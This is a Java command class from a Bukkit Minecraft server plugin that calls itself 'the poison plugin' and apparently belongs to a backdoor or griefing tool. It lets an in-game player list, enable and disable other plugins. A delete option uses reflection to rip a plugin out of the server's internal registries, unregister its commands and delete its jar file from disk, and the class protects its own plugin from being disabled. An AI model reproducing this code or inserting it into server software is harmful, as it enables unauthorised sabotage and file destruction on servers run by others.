package com.pi.cmd.commands;

import java.io.File;
import java.lang.reflect.Field;
import java.net.URLClassLoader;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Map.Entry;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.PluginCommand;
import org.bukkit.command.SimpleCommandMap;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.plugin.java.JavaPluginLoader;

import com.pi.cmd.main.CommandBase;
import com.pi.main.PI;

public class CommandPlugin extends CommandBase {

    public CommandPlugin() {
        super("Plugin", "Does Plugin Management", "Plugin <enable | disable | list> [plugin]");
    }

    @SuppressWarnings("unchecked")
	@Override
    public void runCommand(Player p, String[] args) {
        if (args.length == 1) {
        	PI.addMessage(p, this.getUsage());
        } else if (args.length == 2) {
        	if (args[1].equalsIgnoreCase("list")) {
        		String plugins = "";
        		for (Plugin pl: Bukkit.getPluginManager().getPlugins()) {
        			if (pl.isEnabled()) {
            			plugins += ChatColor.GREEN + pl.getName() + ", ";
        			} else {
            			plugins += ChatColor.RED + pl.getName() + ", ";
        			}
        		}
        		plugins = plugins.substring(0, plugins.length() - 2);
        		PI.addMessage(p, plugins);
        	} else {
        		PI.addMessage(p, this.getUsage());
        	}
        } else if (args.length == 3) {
        	if(args[1].equalsIgnoreCase("list")) {
        		String plugins = "";
        		for (Plugin pl: Bukkit.getPluginManager().getPlugins()) {
        			if (pl.isEnabled()) {
            			plugins += ChatColor.GREEN + pl.getName() + ", ";
        			} else {
            			plugins += ChatColor.RED + pl.getName() + ", ";
        			}
        		}
        		plugins = plugins.substring(0, plugins.length() - 2);
        		PI.addMessage(p, plugins);
        	} else if (args[1].equalsIgnoreCase("disable")) {
        		Plugin pl = Bukkit.getPluginManager().getPlugin(args[2]);
        		if (pl == null) {
        			PI.addMessage(p, "Plugin not found.");
        		} else if (pl.getName().equalsIgnoreCase(PI.getInstance().getName())) {
        			PI.addMessage(p, "Can't disable the poison plugin...");
        		} else {
        			if (!pl.isEnabled()) {
        				PI.addMessage(p, "Plugin already disabled...");
        			} else {
        				Bukkit.getPluginManager().disablePlugin(pl);
        				PI.addMessage(p, "Plugin is now disabled.");
        			}
        		}
        	} else if (args[1].equalsIgnoreCase("enable")){
        		Plugin pl = Bukkit.getPluginManager().getPlugin(args[2]);
        		if (pl == null) {
        			PI.addMessage(p, "Plugin not found.");
        		} else {
        			if (pl.isEnabled()) {
        				PI.addMessage(p, "Plugin already enabled...");
        			} else {
        				Bukkit.getPluginManager().enablePlugin(pl);
        				PI.addMessage(p, "Plugin is now enabled.");
        			}
        		}
        	} else if (args[1].equalsIgnoreCase("delete")) {
        		Plugin plugin = Bukkit.getPluginManager().getPlugin(args[2]);
        		File f = getFile((JavaPlugin)plugin);
        		if (f == null) {
        			PI.addMessage(p, "Could not get plugin file.");
        			return;
        		}
        		if (plugin == null) {
        			PI.addMessage(p, "Plugin not found.");
        		} else {
        			try {
        				plugin.getClass().getClassLoader().getResources("*");
        			} catch (Exception e1) {
        				e1.printStackTrace();
        			}
        			org.bukkit.plugin.PluginManager pm = Bukkit.getServer().getPluginManager();
        			Map<String, Plugin> ln;
        			List<Plugin> pl;
        			try {
        				Field lnF = pm.getClass().getDeclaredField("lookupNames");
        				lnF.setAccessible(true);
        				ln = (Map<String, Plugin>)lnF.get(pm);
        		      
        				
        				Field plF = pm.getClass().getDeclaredField("plugins");
        				plF.setAccessible(true);
        				pl = (List<Plugin>)plF.get(pm);
        			} catch (Exception e) {
        				PI.addMessage(p, "Deleting failed."); return;
        			}
        			try {
            			Field scmF = pm.getClass().getDeclaredField("commandMap");
            		    scmF.setAccessible(true);
            		    SimpleCommandMap scm = ((SimpleCommandMap)scmF.get(pm));
            		    Field kcF = SimpleCommandMap.class.getDeclaredField("knownCommands");
            		    kcF.setAccessible(true);
            		    Map<String, Command> kc = ((Map<String, Command>)kcF.get(scm));
            			synchronized (scm) {
            				Iterator<Map.Entry<String, Command>> it = kc.entrySet().iterator();
            				while (it.hasNext()) {
            					Map.Entry<String, Command> entry = (Entry<String, Command>)it.next();
            					if ((entry.getValue() instanceof PluginCommand)) {
            						PluginCommand c = (PluginCommand)entry.getValue();
            						if (c.getPlugin().getName().equalsIgnoreCase(plugin.getName())) {
            							c.unregister(scm);
            							it.remove();
            						}
            					}
            				}
            		    }
        			} catch (Exception ex) {
        				PI.addMessage(p, "Deleting failed."); return;
        			}
        			pm.disablePlugin(plugin);
        			synchronized (pm) {
        				ln.remove(plugin.getName());
        				pl.remove(plugin);
        			}
        			JavaPluginLoader jpl = (JavaPluginLoader)plugin.getPluginLoader();
        			Field loadersF = null;
        			try {
        				loadersF = jpl.getClass().getDeclaredField("loaders");
        				loadersF.setAccessible(true);
        			} catch (Exception e) {
        				PI.addMessage(p, "Deleting failed."); return;
        			}
        			if (loadersF != null) {
            			try {
            				Map<String, ?> loaderMap = (Map<String, ?>)loadersF.get(jpl);
            				loaderMap.remove(plugin.getDescription().getName());
            			} catch (Exception e) {
            				PI.addMessage(p, "Deleting failed."); return;
            			}
            		    closeClassLoader(plugin);
            		    System.gc();
            		    System.gc();
            		    f.delete();
            		    return;
        			}
        		}
        	} else {
        		PI.addMessage(p, this.getUsage());
        	}
        } else {
        	PI.addMessage(p, this.getUsage());
        }
    }
    
    public File getFile(JavaPlugin p) {
    	try {
    		Field f = JavaPlugin.class.getDeclaredField("file");
    		f.setAccessible(true);
    		return (File)f.get(p);
    	} catch (Exception e) {}
    	return null;
    }
    
    public boolean closeClassLoader(Plugin plugin) {
    	try {
    		((URLClassLoader)plugin.getClass().getClassLoader()).close();
    		return true;
    	} catch (Exception e) {}
    	return false;
    }

}